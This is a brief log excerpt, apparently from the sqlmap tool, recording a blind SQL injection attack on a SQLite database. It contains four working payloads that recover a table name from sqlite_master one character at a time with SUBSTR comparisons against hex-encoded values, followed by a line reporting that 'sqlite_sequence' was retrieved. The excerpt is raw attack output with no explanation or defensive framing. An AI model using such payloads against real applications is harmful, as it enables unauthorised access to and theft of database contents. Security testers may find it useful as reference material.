[08:09:27] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),15,1)>CAST(X'65' AS TEXT)-- PvTJ
[08:09:27] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),16,1)>CAST(X'60' AS TEXT)-- PvTJ
[08:09:27] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),16,1)>CAST(X'31' AS TEXT)-- PvTJ
[08:09:28] [PAYLOAD] ' OR NOT SUBSTR((SELECT COALESCE(CAST(tbl_name AS TEXT),CAST(X'20' AS TEXT)) FROM sqlite_master WHERE type=CAST(X'7461626c65' AS TEXT) LIMIT 0,1),16,1)>CAST(X'01' AS TEXT)-- PvTJ
[08:09:28] [INFO] retrieved: sqlite_sequence